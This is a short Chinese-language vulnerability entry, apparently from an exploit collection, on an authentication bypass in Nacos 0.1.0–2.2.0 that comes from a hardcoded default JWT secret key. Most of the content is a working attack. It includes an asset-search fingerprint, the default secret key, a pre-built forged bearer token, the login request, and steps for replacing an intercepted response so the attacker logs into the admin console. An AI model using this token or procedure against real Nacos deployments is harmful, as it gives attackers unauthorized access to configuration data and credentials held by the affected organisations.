# Nacos默认key导致权限绕过登陆漏洞

- **系统**：Nacos　|　**类型**：认证/授权绕过　|　**CVE**：—
- **指纹**：`app.name="Nacos"`
- **请求**：`POST /nacos/v1/auth/users/login HTTP/1.1`

**请求体 / payload**
```
1. Nacos的token.secret.key值是固定死的
nacos/conf/application.properties   //位于该文件中
SecretKey012345678901234567890123456789012345678901234567890123456789
2. 构造JWT
3. 构造数据包获取accesstoken
Host:
Content-Length: 28
Content-Type: application/x-www-form-urlencoded
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6NDA3MDk1MzY0M30.XPfd1WnNHqQdu5-D734ishsizYCEbsQG7mVwdm4MyWg
username=nacos&password=1111
4. 登录系统
将返回包内容全部复制，然后在登陆时抓包，拦截返回包替换，然后发包即可登录后台\
在账号密码错误的情况下返回包为403\

将拦截的返回包替换为之前的返回包内容\

发包之后成功登录后台\
```

**其他**
- Nacos默认key导致权限绕过登陆漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 0.1.0 <= Nacos <= 2.2.0